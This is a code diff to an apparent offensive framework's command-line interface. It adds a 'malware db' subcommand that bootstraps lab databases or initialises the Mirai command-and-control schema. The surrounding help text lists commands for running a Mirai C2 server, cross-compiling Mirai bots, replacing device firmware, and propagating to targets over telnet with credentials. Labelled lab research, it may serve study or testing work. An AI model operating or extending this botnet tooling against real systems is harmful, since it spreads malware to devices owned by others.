@@ -2164,6 +2164,7 @@ Malware commands (lab / authorized research):
   malware shell <ip> [port] One-shot shell/session probe
   malware firmware <img> <ip>  Firmware replace (gated)
   malware c2 start|stop|status|build-go   Go Mirai CNC (SQLite/MySQL/Postgres)
+  malware db bootstrap|init               Copy sample DBs or init mirai schema
   malware crosscompile list|all|<arch>    Cross-build Mirai bots (mips/arm/...)
   malware crosscompile install            Download uClibc toolchains (lab)
   malware propagate <target>              Scan + arch-aware deploy (telnet/creds)
@@ -2282,6 +2283,30 @@ Modules:
             plan = firmware_replace_plan(parts[2], Path(parts[1]))
             for step in plan.get("steps", []):
                 print_info("  - {}".format(step))
+            return
+
+        if sub == "db":
+            from industrialxpl.core.malware.db_init import bootstrap_lab_dbs, default_dsn, init_schema
+            action = (parts[1].lower() if len(parts) >= 2 else "bootstrap")
+            force = "--force" in [p.lower() for p in parts[2:]]
+            if action == "bootstrap":
+                r = bootstrap_lab_dbs(force=force)
+                if not r.get("success"):
+                    print_error(r.get("error", "bootstrap failed"))
+                    return
+                print_success("Lab DBs → {}".format(r.get("target")))
+                for row in r.get("files", []):
+                    print_info("  {} {} ({})".format(row.get("action"), row.get("file"), row.get("path")))
+                return
+            if action == "init":
+                dsn = str(self.global_variables.get("C2_DSN", "")) or default_dsn()
+                r = init_schema(dsn)
+                if r.get("success"):
+                    print_success("mirai schema: {} ({})".format(r.get("dialect"), r.get("path", r.get("dsn"))))
+                else:
+                    print_error(r.get("error", "init failed"))
+                return
+            print_error("Usage: malware db bootstrap|init [--force]")
             return
 
         if sub == "c2":
